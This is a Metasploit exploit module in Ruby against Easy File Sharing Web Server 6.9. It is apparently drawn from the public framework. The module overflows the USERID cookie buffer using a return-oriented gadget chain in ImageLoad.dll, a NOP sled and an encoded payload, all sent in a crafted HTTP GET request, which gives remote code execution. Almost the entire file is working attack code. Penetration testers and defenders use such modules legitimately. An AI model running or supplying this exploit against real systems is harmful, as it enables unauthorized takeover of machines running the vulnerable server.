##
## This module requires Metasploit: http://metasploit.com/download
## Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
                      'Name'    => 'Easy File Sharing Web Server - USERID Remote Buffer Overflow',
                      'Description'  => %q{
        This module exploits the buffer used to store the USERID component of
        a HTTP request. A specially crafted request will overflow this buffer
        resulting in arbitrary code execution.
        More details at https://www.exploit-db.com/exploits/37951
                      },
                        'License'    => MSF_LICENSE,
                        'Author'    =>
                      [
                        'Tracy Turben (tracyturben@gmail.com)',  # Original discovery
                        'thesubtlety - noah@thesubtlety.com',  # MSF Module
                        'John Bird (justarandomuser@github.com)',  # MSF Module
                      ],
                      'References'  =>
                      [
                        [ 'EDB', '33453' ]
                      ],
                      'DefaultOptions' =>
                      {
                        'EXITFUNC' => 'thread',
                      },
                      'Platform'  => ['win'],
                      'Payload'  =>
                      {
                        'BadChars' => "\x00\x0a\x0d\x3b",
                        'DisableNops' => true,
                        'Space' => 3660
                      },
                      'Targets'    =>
                      [
                        [ 'Easy File Sharing Web Server 6.9', { } ]
                      ],
                      'Privileged'  => false,
                      'DisclosureDate'  => 'Aug 22 2015',
                      'DefaultTarget'  => 0))

    register_options([Opt::RPORT(80)], self.class)

  end

  def check
    res = send_request_cgi({ 'uri' => '/' })
    if (res && res.headers['Server']) =~ /Easy File Sharing Web Server v6\.9/
      return Exploit::CheckCode::Appears
    else
      return Exploit::CheckCode::Unknown
    end
    Exploit::CheckCode::Safe
  end

  def exploit

    junk0 = make_nops(80)

    # 0x1001d89b : {pivot 604 / 0x25c} # POP EDI # POP ESI # POP EBP # POP EBX # ADD ESP,24C # RETN [ImageLoad.dll]
    # The memory located at 0x1001D8F0: "\x7A\xD8\x01\x10" does the job!
    # Due to call dword ptr [edx+28h]: 0x1001D8F0 - 28h = 0x1001D8C8
    call_edx = [0x1001D8C8].pack('V')
    junk1 = make_nops(396)
    ppr = [0x10010101].pack('V') # POP EBX # POP ECX # RETN [ImageLoad.dll]

    # Since 0x00 would break the exploit 00520498 PUSH ESP needs to be crafted on the stack.
    crafted_jmp_esp = [0xA4523C15].pack('V')
    test_bl = [0x10010125].pack('V') # contains 00000000 to pass the JNZ instruction
    kungfu = [0x10022aac].pack('V')  # MOV EAX,EBX # POP ESI # POP EBX # RETN [ImageLoad.dll]
    kungfu << [0xDEADBEEF].pack('V') # filler
    kungfu << [0xDEADBEEF].pack('V') # filler
    kungfu << [0x1001a187].pack('V') # ADD EAX,5BFFC883 # RETN [ImageLoad.dll] # finish crafting JMP ESP
    kungfu << [0x1002466d].pack('V') # PUSH EAX # RETN [ImageLoad.dll]

    nopsled = make_nops(20)

    sploit = junk0 + call_edx + junk1 + ppr + crafted_jmp_esp + test_bl + kungfu + nopsled + payload.encoded

    print_status("Sending request...")

    send_request_cgi({
      'uri'          => '/vfolder.ghp',
      'method'       => 'GET',
      'cookie'       => "SESSIONID=1337; UserID=#{sploit}; PassWD=;",
      'connection'   => "Keep-Alive",
      'headers'      =>
      {
        'Accept'          => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language' => 'en-us',
        'Accept-Encoding'  => 'gzip, deflate'
      }
    })

    handler

  end

end

